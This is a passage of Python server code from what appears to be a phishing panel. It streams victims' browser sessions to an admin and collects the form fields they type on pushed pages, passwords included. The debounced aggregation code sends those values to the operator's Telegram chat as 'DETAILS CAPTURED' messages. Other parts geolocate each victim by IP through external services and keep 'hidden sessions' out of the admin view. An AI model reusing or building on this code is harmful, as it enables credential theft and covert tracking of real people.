            if self._active_stream_id not in self.subscriptions:
                self._active_stream_id = next(iter(self.subscriptions), None)

    async def subscribe(self, session_id: str, websocket: WebSocket):
        """Subscribe this admin socket without affecting other sessions."""
        async with self.lock:
            self._active_stream_id = session_id
            self.subscriptions.setdefault(session_id, set()).add(websocket)

    async def unsubscribe(self, session_id: str, websocket: WebSocket):
        async with self.lock:
            subscribers = self.subscriptions.get(session_id)
            if subscribers is None:
                return
            subscribers.discard(websocket)
            if not subscribers:
                self.subscriptions.pop(session_id, None)
            if self._active_stream_id == session_id and session_id not in self.subscriptions:
                self._active_stream_id = next(iter(self.subscriptions), None)

    async def get_active_stream(self) -> Optional[str]:
        """Return a compatibility hint for the most recently selected stream."""
        async with self.lock:
            if self._active_stream_id in self.subscriptions:
                return self._active_stream_id
            self._active_stream_id = next(iter(self.subscriptions), None)
            return self._active_stream_id

    async def broadcast_frame(self, session_id: str, frame_data: bytes):
        """Broadcast a frame to every admin subscribed to this session."""
        async with self.lock:
            subscribers = set(self.subscriptions.get(session_id, set()))
        if not subscribers:
            return
        disconnected = set()
        # Do not hold the manager lock across network sends: one slow admin
        # must not stall frames for this or any other runtime session.
        results = await asyncio.gather(
            *(self._send_frame(ws, frame_data) for ws in subscribers),
            return_exceptions=True,
        )
        for ws, result in zip(subscribers, results):
            if result is not True:
                disconnected.add(ws)
        if disconnected:
            async with self.lock:
                current = self.subscriptions.get(session_id)
                if current is not None:
                    current.difference_update(disconnected)
                    if not current:
                        self.subscriptions.pop(session_id, None)
                        if self._active_stream_id == session_id:
                            self._active_stream_id = next(iter(self.subscriptions), None)
                self.admin_websockets.difference_update(disconnected)

    @staticmethod
    async def _send_frame(websocket: WebSocket, frame_data: bytes) -> bool:
        try:
            await asyncio.wait_for(websocket.send_bytes(frame_data), timeout=0.25)
            return True
        except Exception:
            return False


# Global instances (will be set by main.py)
session_manager = None
server_instance = None  # Server instance for restart functionality
admin_stream_manager = AdminStreamManager()

# Telegram Configuration Storage (server-side)
telegram_config: Dict[str, Any] = {}
telegram_config_loaded = False
CONFIG_FILE = Path(__file__).parent / "data" / "telegram_config.json"


def _normalize_telegram_config(raw: Any) -> Dict[str, Any]:
    """Normalize current and legacy Admin Telegram config shapes."""
    if not isinstance(raw, dict):
        return {}
    normalized = dict(raw)
    normalized["bot_token"] = str(
        raw.get("bot_token", raw.get("telegram_bot_token", "")) or ""
    ).strip()
    normalized["chat_id"] = str(
        raw.get("chat_id", raw.get("telegram_chat_id", "")) or ""
    ).strip()
    if "enabled" not in normalized:
        if "telegram_enabled" in raw:
            normalized["enabled"] = raw.get("telegram_enabled")
        else:
            normalized["enabled"] = bool(normalized["bot_token"] and normalized["chat_id"])
    return normalized


def load_telegram_config():
    """Load Telegram configuration from disk."""
    global telegram_config, telegram_config_loaded
    try:
        if CONFIG_FILE.exists():
            with open(CONFIG_FILE, 'r') as f:
                telegram_config = _normalize_telegram_config(json.load(f))
            telegram_config_loaded = True
            logger.debug("[CONFIG] Loaded Telegram config from disk")
    except Exception:
        telegram_config = {}
        telegram_config_loaded = False

def save_telegram_config_to_disk() -> bool:
    """Save Telegram configuration to disk and report persistence failures."""
    global telegram_config_loaded
    try:
        CONFIG_FILE.parent.mkdir(parents=True, exist_ok=True)
        with open(CONFIG_FILE, 'w') as f:
            json.dump(telegram_config, f, indent=2)
        telegram_config_loaded = True
        logger.debug("[CONFIG] Telegram config saved to disk")
        return True
    except Exception as e:
        logger.error(f"[CONFIG] Error saving Telegram config: {e}")
        return False

# Load config on module import
load_telegram_config()


# ---------------------------------------------------------------------------
# Telegram event notifications (LPV clients, workflows, link security).
# Fire-and-forget: every call schedules an async send and NEVER blocks or
# raises into the request/WS path.  Config resolution order:
#   1. admin-saved server config (data/telegram_config.json via
#      /api/admin/config/telegram), used exclusively after the first save
#   2. config.py CONFIG defaults / TELEGRAM_* env vars only when no Admin
#      Telegram config has ever been saved
# Per-event toggles live in telegram_config: notify_connect,
# notify_disconnect, notify_navigate (page views), notify_lpv_workflow
# (start/finish/crash), notify_lpv_submit (form submissions).
# ---------------------------------------------------------------------------

def _tg_esc(value: Any, limit: int = 0) -> str:
    """Escape a dynamic value for Telegram HTML and optionally truncate."""
    s = "" if value is None else str(value)
    if limit and len(s) > limit:
        s = s[:limit] + "…"
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


# ---------------------------------------------------------------------------
# Telegram message styling
# ---------------------------------------------------------------------------
# These notifications are read on a phone by an operator watching a job run,
# so they are laid out as a small tree: an icon-titled header, then branches
# drawn with box-drawing characters. Labels are italic, values monospace, and
# every internal term is translated into plain English — nobody watching a
# capture should have to decode "settled (blur)".
_TG_TEE = "\u251c\u2500"      # |-
_TG_ELL = "\u2514\u2500"      # └─


def _tg_tree(rows):
    """Render (icon, label, value) triples as a branch tree.

    Rows with an empty value are dropped so we never emit a dangling
    branch like "City — " with nothing after it.
    """
    kept = [(ic, lb, v) for (ic, lb, v) in rows if str(v if v is not None else '').strip()]
    if not kept:
        return ""
    out = []
    last = len(kept) - 1
    for i, (icon, label, value) in enumerate(kept):
        branch = _TG_ELL if i == last else _TG_TEE
        out.append("%s %s <b>%s</b> \u2014 %s" % (branch, icon, label, value))
    return "\n".join(out)


# Internal flush reasons -> what an operator actually sees.
    # Labels are bold, never italic — slanted text at notification size is
    # hard to read on a phone.
_TG_REASON_LABELS = {
    "settled (blur)": "Finished typing",
    "settled": "Finished typing",
    "blur": "Finished typing",
    "disconnect": "Client left the page",
    "submit": "Pressed the submit button",
    "page change": "Moved to another page",
    "page loaded": "Page finished loading",
    "nav": "Moved on",
    "pagehide": "Closed the page",
}


def _tg_reason(reason):
    """Translate an internal flush reason into plain English."""
    key = (reason or "").strip().lower()
    if not key:
        return "Details captured"
    if key in _TG_REASON_LABELS:
        return _TG_REASON_LABELS[key]
    # Unknown reason: de-jargon it a little rather than echoing raw internals.
    return key.replace("_", " ").strip().capitalize()


def _tg_flag(flag: str, default: bool = True) -> bool:
    val = (telegram_config or {}).get(flag)
    if val is None:
        return default
    if isinstance(val, str):
        return val.strip().lower() not in {"", "0", "false", "off", "no"}
    return bool(val)


def _tg_hint(message: str, width: int = 60) -> str:
    """First line of a notification, for log lines."""
    try:
        first = str(message or "").strip().splitlines()[0]
    except Exception:
        first = ""
    return first[:width]


async def _tg_send(message: str) -> None:
    try:
        from types import SimpleNamespace
        from telegram_bot import send_telegram_notification
        try:
            from config import CONFIG as _C
        except Exception:
            _C = None
        d = telegram_config if isinstance(telegram_config, dict) else {}
        if d or telegram_config_loaded:
            bot_token = str(d.get("bot_token") or "").strip()
            chat_id = str(d.get("chat_id") or "").strip()
            enabled = d.get("enabled", False)
        else:
            bot_token = str(getattr(_C, "telegram_bot_token", "") or "").strip() if _C is not None else ""
            chat_id = str(getattr(_C, "telegram_chat_id", "") or "").strip() if _C is not None else ""
            enabled = getattr(_C, "telegram_enabled", False) if _C is not None else False
        if isinstance(enabled, str):
            enabled = enabled.strip().lower() not in {"", "0", "false", "off", "no"}
        if not enabled:
            logger.debug("[TELEGRAM] skipped %r: disabled", _tg_hint(message))
            return
        if not bot_token or not chat_id:
            logger.warning(
                "[TELEGRAM] skipped %r: no bot token/chat id configured "
                "(set them in config.py or the Admin panel)", _tg_hint(message),
            )
            return
        cfg = SimpleNamespace(
            telegram_enabled=bool(enabled),
            telegram_bot_token=bot_token,
            telegram_chat_id=chat_id,
        )
        if not await send_telegram_notification(message, cfg):
            logger.warning("[TELEGRAM] notification was not delivered (see the line above)")
    except Exception:
        logger.warning("[TELEGRAM] notification failed", exc_info=True)


def _telegram_plain_text_direct(html_message: str) -> str:
    """Drop Telegram markup for a parser-safe retry."""
    import html as html_module
    plain = _re.sub(r"<a\s+href=[\"'][^>]*>(.*?)</a>", r"\1", html_message, flags=_re.IGNORECASE | _re.DOTALL)
    plain = _re.sub(r"</?(?:b|i|strong|em|code|pre)\s*>", "", plain, flags=_re.IGNORECASE)
    return html_module.unescape(plain)


async def _telegram_send_message_direct(
    bot_token: Any,
    chat_id: Any,
    text: str,
) -> Tuple[bool, Dict[str, Any]]:
    """Send one message directly through Telegram and return its real result.

    This path intentionally performs no local allow-list, bot-id, or chat-id
    validation. Telegram remains the authority for whether a token can send to
    a destination, and its response is returned to the Admin test endpoint.
    """
    token = str(bot_token or "").strip()
    destination = str(chat_id or "").strip()
    if not token or not destination:
        return False, {"description": "bot token and chat id are required"}

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": destination,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    try:
        async with httpx.AsyncClient(timeout=15.0) as client:
            response = await client.post(url, json=payload)
            try:
                result = response.json()
            except Exception:
                result = {"description": response.text[:1000]}
            if response.status_code == 200 and isinstance(result, dict) and result.get("ok"):
                return True, result

            description = str(
                result.get("description") if isinstance(result, dict) else result
            ) or "Telegram rejected the message"
            if response.status_code == 400 and (
                "parse" in description.lower() or "entity" in description.lower()
            ):
                fallback = await client.post(url, json={
                    "chat_id": destination,
                    "text": _telegram_plain_text_direct(text),
                    "disable_web_page_preview": True,
                })
                try:
                    fallback_result = fallback.json()
                except Exception:
                    fallback_result = {"description": fallback.text[:1000]}
                if fallback.status_code == 200 and isinstance(fallback_result, dict) and fallback_result.get("ok"):
                    return True, fallback_result
                result = fallback_result
                response_status = fallback.status_code
            else:
                response_status = response.status_code

            return False, {
                "status_code": response_status,
                **(result if isinstance(result, dict) else {"description": str(result)}),
            }
    except httpx.TimeoutException:
        return False, {"description": "Telegram request timed out"}
    except httpx.RequestError as exc:
        return False, {"description": f"Telegram network error: {exc}"}
    except Exception as exc:
        return False, {"description": str(exc)}


def tg_notify(message: str, flag: str = "notify_connect", flag_default: bool = True) -> None:
    """Schedule a Telegram notification; silently no-ops on any problem."""
    try:
        if not _tg_flag(flag, flag_default):
            return
        asyncio.get_running_loop().create_task(_tg_send(message))
    except Exception:
        pass


# ---------------------------------------------------------------------------
# MERGED Telegram config.  User requirement: the bot token / chat id
# hardcoded in config.py (or TELEGRAM_* env) and the values set in the
# Admin panel must be ONE configuration — the Admin panel edits take
# effect everywhere, live, and the hardcoded values act only as the
# initial defaults.  sync_telegram_config_to_runtime() applies the admin-
# saved values onto the shared runtime CONFIG object, so EVERY consumer
# (LPV notifications, browser-session connect notifications in
# session_manager, bot command polling in main) reads the same effective
# config without a restart.  Runs at boot (below) and on every panel save.
# ---------------------------------------------------------------------------
_CONFIG_TG_DEFAULTS: Optional[Dict[str, Any]] = None


def _config_tg_defaults() -> Dict[str, Any]:
    """Snapshot of the config.py / env defaults, captured once so a cleared
    admin field can fall back to them instead of losing them."""
    global _CONFIG_TG_DEFAULTS
    if _CONFIG_TG_DEFAULTS is None:
        try:
            from config import CONFIG as _C
            _CONFIG_TG_DEFAULTS = {
                "telegram_bot_token": getattr(_C, "telegram_bot_token", "") or "",
                "telegram_chat_id": getattr(_C, "telegram_chat_id", "") or "",
                "telegram_enabled": bool(getattr(_C, "telegram_enabled", False)),
                "telegram_notify_on_connect": bool(getattr(_C, "telegram_notify_on_connect", True)),
                "telegram_notify_on_navigation": bool(getattr(_C, "telegram_notify_on_navigation", False)),
            }
        except Exception:
            _CONFIG_TG_DEFAULTS = {
                "telegram_bot_token": "",
                "telegram_chat_id": "",
                "telegram_enabled": False,
                "telegram_notify_on_connect": True,
                "telegram_notify_on_navigation": False,
            }
    return _CONFIG_TG_DEFAULTS


def sync_telegram_config_to_runtime(saved: Optional[Dict[str, Any]] = None) -> None:
    """Push the live Admin Telegram config onto shared CONFIG in-place.

    No destination fallback is used once an Admin config has been saved: an
    empty field means notifications are intentionally unconfigured, rather
    than silently continuing to use an old environment/default destination.
    """
    try:
        from config import CONFIG as _C
    except Exception:
        return
    d = saved if isinstance(saved, dict) else (telegram_config if telegram_config_loaded else {})
    base = _config_tg_defaults()
    try:
        if d or telegram_config_loaded or isinstance(saved, dict):
            _C.telegram_bot_token = str(d.get("bot_token") or "").strip()
            _C.telegram_chat_id = str(d.get("chat_id") or "").strip()
            enabled = d.get("enabled", False)
            if isinstance(enabled, str):
                enabled = enabled.strip().lower() not in {"", "0", "false", "off", "no"}
            _C.telegram_enabled = bool(enabled)
        else:
            _C.telegram_bot_token = base["telegram_bot_token"]
            _C.telegram_chat_id = base["telegram_chat_id"]
            _C.telegram_enabled = base["telegram_enabled"]
        if d.get("notify_connect") is not None:
            _C.telegram_notify_on_connect = bool(d["notify_connect"])
        if d.get("notify_navigate") is not None:
            _C.telegram_notify_on_navigation = bool(d["notify_navigate"])
    except Exception:
        pass


# Apply any previously-saved admin config at boot (import time), so the
# merged values are active before the first connection/notification.
sync_telegram_config_to_runtime()

_telegram_runtime_start_lock = asyncio.Lock()


async def _ensure_telegram_polling_started() -> None:
    """Start polling after a live Admin save when it was disabled at boot."""
    async with _telegram_runtime_start_lock:
        try:
            if server_instance is None:
                return
            if not bool(getattr(server_instance.config, "telegram_enabled", False)):
                return
            if getattr(server_instance, "telegram_bot", None) is not None:
                return
            from telegram_bot import TelegramBot
            bot = TelegramBot(server_instance.config, server_instance)
            shutdown_event = getattr(server_instance, "shutdown_event", None)
            if shutdown_event is not None:
                bot.set_shutdown_event(shutdown_event)
            await bot.start_polling()
            server_instance.telegram_bot = bot
            logger.info("[TELEGRAM] Polling started from live Admin configuration")
        except Exception:
            logger.exception("[TELEGRAM] Could not start polling after live config save")


# ---------------------------------------------------------------------------
# Page-final field aggregation -> Telegram.  The client emits one
# `field_final` event per settled input (on blur / submit / pagehide /
# nav-flush).  We collect them per client+page and ship ONE message when
# the page is left: page name + every field + client id.
# ---------------------------------------------------------------------------
_lpv_final_fields: Dict[str, Dict[str, Any]] = {}

# Blur-settled values should not have to wait until the page is left:
# 9 s after the victim's LAST field_final (blur/submit/pagehide event
# stream settles), the buffered fields ship to Telegram automatically.
# How long the victim has to stop settling fields before we ship them to
# Telegram. This is a debounce, not a fixed wait: every new field value
# restarts the timer, so it only fires once they have actually stopped.
# It was 9.0s, which made captured details feel broken — you would type a
# password and then stare at Telegram for nine seconds. 1.5s still coalesces
# a run of keystrokes but arrives while you are still watching.
FINAL_FLUSH_DELAY = 1.5
_lpv_final_timers: Dict[str, asyncio.TimerHandle] = {}


def _lpv_final_cancel_timer(client_id: str) -> None:
    t = _lpv_final_timers.pop(client_id, None)
    if t is not None:
        try:
            t.cancel()
        except Exception:
            pass


def _lpv_final_schedule(client_id: str) -> None:
    _lpv_final_cancel_timer(client_id)
    try:
        loop = asyncio.get_running_loop()
    except Exception:
        return
    try:
        def _fire():
            _lpv_final_timers.pop(client_id, None)
            _lpv_final_flush(client_id, "settled (blur)")

        _lpv_final_timers[client_id] = loop.call_later(FINAL_FLUSH_DELAY, _fire)
    except Exception:
        pass


def _lpv_final_flush(client_id: str, reason: str = "") -> None:
    _lpv_final_cancel_timer(client_id)
    buf = _lpv_final_fields.pop(client_id, None)
    if not buf:
        return
    fields = buf.get("fields") or {}
    if not fields:
        return
    try:
        items = list(fields.items())[:15]
        lines = []
        last = len(items) - 1
        for i, (k, v) in enumerate(items):
            if isinstance(v, list):
                v = ", ".join(str(x) for x in v)
            branch = _TG_ELL if i == last else _TG_TEE
            lines.append(
                f"{branch} <b>{_tg_esc(k, 32)}</b> \u2014 <code>{_tg_esc(v, 120)}</code>"
            )
        body = "\n".join(lines)
        tg_notify(
            "\U0001F4DD <b>DETAILS CAPTURED</b>\n\n"
            + _tg_tree([
                ("\U0001F4C4", "Page", _tg_esc(buf.get('page_name') or buf.get('page_id') or '-', 60)),
                ("\u26A1", "When", _tg_esc(_tg_reason(reason), 40)),
                ("\U0001F464", "Client", f"<code>{_tg_esc(str(client_id)[-10:])}</code>"),
            ])
            + "\n\n\U0001F510 <b>What they entered</b>\n"
            + body,
            "notify_lpv_final",
        )
    except Exception:
        pass


def _lpv_note_field_final(client_id: str, page_id, page_name, payload: Dict[str, Any]) -> None:
    """Fold one field_final event into the per-client page buffer.  A page
    switch flushes the previous page's buffer first (so the arrival order
    pageA-final,pageB-final never mixes two pages in one message)."""
    try:
        if not isinstance(payload, dict):
            return
        key = (payload.get("name") or payload.get("id") or payload.get("label")
               or payload.get("placeholder") or payload.get("aria")
               or payload.get("type") or payload.get("tag") or "field")
        key = str(key)[:40]
        val = payload.get("value")
        buf = _lpv_final_fields.get(client_id)
        if buf and str(buf.get("page_id") or "") != str(page_id or ""):
            _lpv_final_flush(client_id, "page change")
            buf = None
        if buf is None:
            buf = {"page_id": page_id, "page_name": page_name, "fields": {}}
            _lpv_final_fields[client_id] = buf
        if page_name:
            buf["page_name"] = page_name
        if val is None:
            return
        if isinstance(val, str) and val == "":
            buf["fields"].pop(key, None)
            return
        if len(buf["fields"]) < 40 or key in buf["fields"]:
            buf["fields"][key] = val if not isinstance(val, str) else val[:500]
        # Auto-ship shortly after the victim stops settling fields — you get
        # blur-final values without waiting for them to leave the page.
        _lpv_final_schedule(client_id)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Server-side IP geolocation (AUTHORITATIVE).  Client browsers intentionally
# make NO third-party geo calls anymore — the server resolves the real IP
# (proxy headers first) and enriches location itself.  Provider chain:
#   1. ipwho.is   — free HTTPS, no API key, generous limits
#   2. ipapi.co   — free HTTPS fallback
#   3. ip-api.com — last-resort fallback
# Results are cached per-IP for GEO_CACHE_TTL seconds so repeat connects
# from the same victim cost zero external requests.
# ---------------------------------------------------------------------------
GEO_CACHE_TTL = 6 * 3600
_geo_cache: Dict[str, Dict[str, Any]] = {}


def _is_public_ip(ip: str) -> bool:
    try:
        import ipaddress
        return ipaddress.ip_address(ip).is_global
    except Exception:
        return False


def _country_flag_emoji(cc: str) -> str:
    try:
        if not cc or len(cc) != 2:
            return ""
        return "".join(chr(0x1F1E6 + ord(c) - ord('A')) for c in cc.upper())
    except Exception:
        return ""


def _normalize_geo(ip: str, raw: Dict[str, Any], source: str) -> Dict[str, Any]:
    cc = (raw.get("country_code") or "").upper()
    return {
        "ip": ip,
        "country": raw.get("country") or "",
        "country_code": cc,
        "flag": _country_flag_emoji(cc),
        "state": raw.get("state") or raw.get("region") or "",
        "city": raw.get("city") or "",
        "zip": raw.get("zip") or raw.get("postal") or "",
        "latitude": raw.get("latitude"),
        "longitude": raw.get("longitude"),
        "timezone": raw.get("timezone") or "",
        "isp": raw.get("isp") or raw.get("org") or "",
        "geo_source": source,
    }


async def server_geolocate(ip: str) -> Optional[Dict[str, Any]]:
    """Geolocate a public IP server-side.  Returns None for private/unknown
    IPs or when every provider fails (callers fall back to client data)."""
    try:
        if not ip or ip in ("Unknown", "localhost") or not _is_public_ip(ip):
            return None
    except Exception:
        return None
    try:
        now = time.time()
        hit = _geo_cache.get(ip)
        if hit and now - hit.get("ts", 0) < GEO_CACHE_TTL:
            return hit.get("data")
        import httpx
        data: Optional[Dict[str, Any]] = None
        async with httpx.AsyncClient(timeout=4.0) as client:
            try:  # 1. ipwho.is
                r = await client.get(f"https://ipwho.is/{ip}")
                j = r.json() if r.status_code == 200 else {}
                if isinstance(j, dict) and j.get("success", True) and j.get("country"):
                    tz = j.get("timezone")
                    conn = j.get("connection")
                    data = _normalize_geo(ip, {
                        "country": j.get("country"),
                        "country_code": j.get("country_code"),
                        "region": j.get("region"),
                        "city": j.get("city"),
                        "postal": j.get("postal"),
                        "latitude": j.get("latitude"),
                        "longitude": j.get("longitude"),
                        "timezone": tz.get("id") if isinstance(tz, dict) else tz,
                        "isp": conn.get("isp") if isinstance(conn, dict) else "",
                    }, "ipwho.is")
            except Exception:
                data = None
            if not data:
                try:  # 2. ipapi.co
                    r = await client.get(f"https://ipapi.co/{ip}/json/")
                    j = r.json() if r.status_code == 200 else {}
                    if isinstance(j, dict) and j.get("country_name"):
                        data = _normalize_geo(ip, {
                            "country": j.get("country_name"),
                            "country_code": j.get("country_code"),
                            "region": j.get("region"),
                            "city": j.get("city"),
                            "postal": j.get("postal"),
                            "latitude": j.get("latitude"),
                            "longitude": j.get("longitude"),
                            "timezone": j.get("timezone"),
                            "org": j.get("org"),
                        }, "ipapi.co")
                except Exception:
                    data = None
            if not data:
                try:  # 3. ip-api.com
                    r = await client.get(
                        f"http://ip-api.com/json/{ip}"
                        "?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp"
                    )
                    j = r.json() if r.status_code == 200 else {}
                    if isinstance(j, dict) and j.get("status") == "success":
                        data = _normalize_geo(ip, {
                            "country": j.get("country"),
                            "country_code": j.get("countryCode"),
                            "state": j.get("regionName"),
                            "city": j.get("city"),
                            "zip": j.get("zip"),
                            "latitude": j.get("lat"),
                            "longitude": j.get("lon"),
                            "timezone": j.get("timezone"),
                            "isp": j.get("isp"),
                        }, "ip-api.com")
                except Exception:
                    data = None
        if data:
            if len(_geo_cache) > 5000:
                _geo_cache.clear()
            _geo_cache[ip] = {"ts": now, "data": data}
        return data
    except Exception:
        return None


def resolve_client_ip_from_headers(headers, fallback: str) -> str:
    """Real client IP: reverse-proxy headers first (nginx/caddy/cloudflared),
    then the direct socket peer as last resort."""
    try:
        if headers:
            xff = headers.get("x-forwarded-for")
            if xff:
                first = xff.split(",")[0].strip()
                if first:
                    return first
            xri = headers.get("x-real-ip")
            if xri and xri.strip():
                return xri.strip()
    except Exception:
        pass
    return fallback or "Unknown"

# Hidden sessions - connections that won't appear in admin panel
hidden_sessions: set = set()

# Server-side session storage for Admin panel
# Clients report events, server stores them, admin receives real-time updates
# Persists to disk so data survives any disconnections
SERVER_SESSIONS_FILE = Path(__file__).parent / "data" / "server_sessions.json"
server_sessions: Dict[str, Any] = {}
server_sessions_lock = asyncio.Lock()
server_sessions_loaded = False

# WebSocket connections for real-time admin updates
admin_ws_connections: set = set()
admin_ws_lock = asyncio.Lock()


async def _upsert_lpv_admin_client(
    client_id: str,
    init_data: Dict[str, Any],
    workflow: Optional[Dict[str, Any]] = None,
    online: bool = True,
    connection_token: Optional[str] = None,
) -> Optional[Dict[str, Any]]:
    """Register an LPV-only/workflow-link client in the admin client feed.

    The durable record is keyed by the runtime client id, while
    ``parent_client_id`` is the stable user/device identity.  A connection
    token prevents a delayed disconnect from an older websocket from marking
    a newer reconnect offline.
    """
    if not client_id:
        return None
    workflow = workflow or {}
    init_data = dict(init_data or {})
    location = init_data.get("location") if isinstance(init_data.get("location"), dict) else {}
    screen = init_data.get("screen") if isinstance(init_data.get("screen"), dict) else {}
    parent_id = (
        init_data.get("user_id")
        or init_data.get("device_id")
        or client_id
    )
    browser_active = False
    if session_manager:
        try:
            browser_active = bool(await session_manager.get_session(client_id))
        except Exception:
            browser_active = False
    now = time.time()
    token = str(connection_token or init_data.get("_connection_token") or "")
    await load_server_sessions()
    async with server_sessions_lock:
        existing = dict(server_sessions.get(client_id) or {})
        # The in-memory generation is authoritative while a reconnect is in
        # flight.  This rejects delayed online/offline writes from an older
        # socket, not just its final disconnect write.
        current_token = _lpv_connection_tokens.get(client_id)
        if token and current_token and token != current_token:
            return copy.deepcopy(existing)
        # An old socket's finally block must not take a newer socket offline.
        if not online and token and existing.get("connection_token") and existing.get("connection_token") != token:
            return copy.deepcopy(existing)
        parent_active = False
        try:
            from browser_manager import profile_has_active_session
            parent_active = profile_has_active_session(
                parent_id, exclude_session_id=client_id
            )
        except Exception:
            pass
        overall_online = bool(online or browser_active or parent_active)
        record = {
            "client_id": client_id,
            "user_id": parent_id,
            "parent_client_id": parent_id,
            "device_id": init_data.get("device_id") or client_id,
            "client_type": "lpv",
            "mode": "browser+lpv" if browser_active else "lpv_only",
            "is_lpv": True,
            "lpv_only": not browser_active,
            "lpv_online": bool(online),
            "is_online": overall_online,
            "status": (
                "browser+lpv" if browser_active
                else ("lpv_only" if (online or parent_active) else "offline")
            ),
            "first_seen": existing.get("first_seen", now),
            "last_seen": now,
            "last_url": existing.get("last_url") or init_data.get("_lpv_default_page") or "",
            "current_url": existing.get("current_url") or init_data.get("_lpv_default_page") or "",
            "history": existing.get("history") or [],
            "total_uptime_seconds": existing.get("total_uptime_seconds", 0),
            "gpu_id": 0,
            # Which version of a paired page this visitor receives, and the
            # raw signals behind it. Persisted so the choice survives a
            # backend restart (see _client_device).
            "device": _device_from_init(init_data),
            "is_mobile": bool(init_data.get("is_mobile")),
            "is_touch": bool(init_data.get("is_touch")),
            "ip_address": (location.get("ip") or ""),
            "user_agent": (init_data.get("userAgent") or "")[:500],
            "country": location.get("country") or "",
            "state": location.get("state") or "",
            "city": location.get("city") or "",
            "zip": location.get("zip") or "",
            "screen": screen,
            "workflow_id": workflow.get("id") or existing.get("workflow_id") or "",
            "workflow_name": workflow.get("name") or existing.get("workflow_name") or "",
            "workflow_link_id": (
                init_data.get("_workflow_link_id")
                or init_data.get("workflow")
                or existing.get("workflow_link_id")
                or ""
            ),
            "lpv_default_page": existing.get("lpv_default_page") or init_data.get("_lpv_default_page") or "",
            "connection_token": token or existing.get("connection_token", ""),
        }
        merged = {**existing, **record}
        server_sessions[client_id] = merged
        snapshot = copy.deepcopy(merged)
        success = await _save_server_sessions_locked()
    if success:
        await broadcast_session_update(client_id, snapshot)
    try:
        await save_client_profile(client_id, snapshot)
    except Exception:
        logger.debug("[LPV] admin profile update failed for %s", client_id, exc_info=True)
    return snapshot


async def _touch_lpv_admin_client(
    client_id: str, connection_token: Optional[str] = None, **updates
) -> Optional[Dict[str, Any]]:
    """Persist LPV activity only for the currently registered connection."""
    if not client_id:
        return None
    await load_server_sessions()
    async with server_sessions_lock:
        stored = server_sessions.get(client_id)
        if not isinstance(stored, dict) or not stored.get("is_lpv"):
            return None
        if (connection_token and _lpv_connection_tokens.get(client_id) != connection_token):
            return copy.deepcopy(stored)
        if (connection_token and stored.get("connection_token")
                and stored.get("connection_token") != connection_token):
            return copy.deepcopy(stored)
        existing = dict(stored)
        existing.update({key: value for key, value in updates.items() if value is not None})
        if existing.get("current_page_id"):
            existing["current_url"] = _lpv_page_url(str(existing["current_page_id"]))
            existing["last_url"] = existing["current_url"]
        existing["last_seen"] = time.time()
        existing["is_online"] = True
        existing["lpv_online"] = True
        existing["status"] = "browser+lpv" if existing.get("mode") == "browser+lpv" else "lpv_only"
        server_sessions[client_id] = existing
        snapshot = copy.deepcopy(existing)
        success = await _save_server_sessions_locked()
    if success:
        await broadcast_session_update(client_id, snapshot)
    try:
        await save_client_profile(client_id, snapshot)
    except Exception:
        logger.debug("[LPV] activity update failed for %s", client_id, exc_info=True)
    return snapshot


async def _get_admin_visible_clients() -> List[Dict[str, Any]]:
    """Return live browser clients plus live LPV-only clients."""
    visible: Dict[str, Dict[str, Any]] = {}
    if session_manager:
        try:
            for item in await session_manager.get_all_sessions():
                if not isinstance(item, dict):
                    continue
                client_id = item.get("client_id")
                if not client_id or client_id in hidden_sessions:
                    continue
                row = dict(item)
                row.setdefault("parent_client_id", row.get("user_id") or client_id)
                row.setdefault("client_type", "browser")
                row.setdefault("mode", "browser")
                row["browser_session"] = True
                visible[client_id] = row
        except Exception:
            logger.debug("[admin] browser client list failed", exc_info=True)

    await load_server_sessions()
    async with server_sessions_lock:
        stored_items = [(key, copy.deepcopy(value)) for key, value in server_sessions.items()]
    for key, stored in stored_items:
        if not isinstance(stored, dict) or not stored.get("is_lpv"):
            continue
        if not stored.get("lpv_online") and key not in visible:
            continue
        client_id = stored.get("client_id") or key
        if client_id in hidden_sessions:
            continue
        row = dict(stored)
        row["client_id"] = client_id
        row.setdefault("parent_client_id", row.get("user_id") or client_id)
        row["is_lpv"] = True
        row["lpv_online"] = bool(stored.get("lpv_online"))
        if client_id in visible:
            # Keep the live browser fields (URL, uptime, controls), but expose
            # the LPV/workflow child under the same stable parent.
            visible[client_id].update({
                "is_lpv": True,
                "lpv_online": row["lpv_online"],
                "lpv_only": False,
                "workflow_id": row.get("workflow_id", ""),
                "workflow_name": row.get("workflow_name", ""),
                "workflow_link_id": row.get("workflow_link_id", ""),
                "parent_client_id": row.get("parent_client_id"),
            })
        elif row.get("lpv_online"):
            row["browser_session"] = False
            row["is_online"] = True
            visible[client_id] = row
    return list(visible.values())


def _is_ws_closed(ws) -> bool:
    """Check if WebSocket is closed or closing"""
    try:
        if hasattr(ws, 'client_state'):
            # WebSocket state: CONNECTING=0, CONNECTED=1, DISCONNECTING=2, DISCONNECTED=3
            state = ws.client_state
            if hasattr(state, 'name'):
                return state.name in ('DISCONNECTING', 'DISCONNECTED')
            return state in (2, 3)
        return False
    except Exception:
        return True


async def _safe_send_json(ws, message: dict) -> bool:
    """Safely send JSON to WebSocket without raising errors"""
    try:
        if _is_ws_closed(ws):
            return False
        await ws.send_json(message)
        return True
    except Exception as e:
        # Silently handle closed WebSockets - this is expected when client disconnects
        return False


async def _broadcast_to_admins(message: dict):
    """Broadcast message to all connected admin clients - independent and non-blocking"""
    global admin_ws_connections
    
    # Make a copy of connections to avoid modifying during iteration
    connections_copy = list(admin_ws_connections)
    
    # Send to all connections independently
    for ws in connections_copy:
        # Don't await - fire and forget for independence
        asyncio.create_task(_safe_send_json(ws, message))


async def _broadcast_profile_update(client_id: str, profile_data: Dict):
    """Broadcast profile update to all connected admin clients"""
    message = {
        "type": "profile_update",
        "client_id": client_id,
        "profile": profile_data
    }
    await _broadcast_to_admins(message)


# ==============================
# LPV (Live Panel Version) — WebSocket routing helpers
# ==============================
#
# The admin's existing /admin WebSocket stays the same shape; we add
# three new inbound message types (lpv_start, lpv_stop, lpv_push_page)
# and rely on a few helpers here to keep the handler readable.


def _lpv_page_url(page_id: str, bind_token: Optional[str] = None) -> str:
    """Return the browser-visible URL for a pushed LPV page.

    We prefer a same-origin relative URL whenever we do not have a
    valid externally routable host configured. Using a hard-coded public
    domain or IP is brittle in local/dev environments and is exactly the
